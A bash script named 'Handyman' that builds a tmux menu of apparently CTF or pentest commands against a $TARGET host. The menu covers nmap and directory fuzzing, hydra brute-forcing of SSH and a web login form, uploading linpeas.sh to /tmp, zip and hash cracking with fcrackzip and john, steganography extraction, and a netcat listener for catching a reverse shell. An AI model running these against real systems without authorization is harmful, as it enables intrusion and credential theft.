#! /bin/bash

EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml

COMMAND_1='nmap -sV -sC $TARGET | highlight "^\d+\/tcp"'
COMMAND_2='ffuf -v -c -recursion -t 64 -e $EXTS -w "$W_COMMON" -u http://$TARGET/FUZZ'
COMMAND_3='gobuster dir -e -l -t 64 -w "$W_COMMON" -x $EXTS -u http://$TARGET | highlight "200|30[12]"'
COMMAND_4='whatweb =v $TARGET'
COMMAND_5='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $TARGET ssh -s PORT'
COMMAND_6='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $TARGET http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
COMMAND_7='ssh $USER@$TARGET -p 22'
COMMAND_8='scp ~/Tools/linpeas.sh $USER@$TARGET:/tmp'
COMMAND_9='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$TARGET/login.php -d "key=FUZZ"'
COMMAND_a='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
COMMAND_b='binwalk -e file.jpg'
COMMAND_c='steghide extract -sf file.jpg'
COMMAND_d='7z x file.zip'
COMMAND_e='python /usr/share/john/ssh2john.py key > key.hash'
COMMAND_f='john --wordlist=$W_PASSWORD --format=FORMAT hash.txt'
COMMAND_g='nc -nlvp 4444'
COMMAND_h='scp ~/Tools/handyman.sh $USER@$TARGET:/tmp'

show_menus() {
  clear
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "                                Handyman                                      "
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "  1) $COMMAND_1"
  echo "  2) $COMMAND_2"
  echo "  3) $COMMAND_3"
  echo "  4) $COMMAND_4"
  echo "  5) $COMMAND_5"
  echo "  6) $COMMAND_6"
  echo "  7) $COMMAND_7"
  echo "  8) $COMMAND_8"
  echo "  9) $COMMAND_9"
  echo "  a) $COMMAND_a"
  echo "  b) $COMMAND_b"
  echo "  c) $COMMAND_c"
  echo "  d) $COMMAND_d"
  echo "  e) $COMMAND_e"
  echo "  f) $COMMAND_f"
  echo "  g) $COMMAND_g"
  echo "  h) $COMMAND_h"
  echo ""
  echo "  x. Exit"
  echo ""
}

runV() {
  tmux setenv TARGET $TARGET
  tmux setenv USER $USER

  tmux split-window -v
  sleep 0.1
  C="$@"
  tmux send-keys "$C"
}

runH() {
  tmux setenv TARGET $TARGET
  tmux setenv USER $USER

  tmux split-window -h
  sleep 0.1
  C="$@"
  tmux send-keys "$C"
}

read_options() {
  local choice
  read -p "Enter choice " choice
  case $choice in
    1) runV $COMMAND_1;;
    2) runV $COMMAND_2;;
    3) runV $COMMAND_3;;
    4) runV $COMMAND_4;;
    5) runV $COMMAND_5;;
    6) runV $COMMAND_6;;
    7) runV $COMMAND_7;;
    8) runV $COMMAND_8;;
    9) runV $COMMAND_9;;
    a) runV $COMMAND_a;;
    b) runV $COMMAND_b;;
    c) runV $COMMAND_c;;
    d) runV $COMMAND_d;;
    e) runV $COMMAND_e;;
    f) runV $COMMAND_f;;
    g) runV $COMMAND_g;;
    h) runV $COMMAND_h;;
    x) exit 0;;
    *) echo -e "Error..."
  esac
}

do_menu() {
  while true
  do
    show_menus
    read_options
  done
}

do_menu
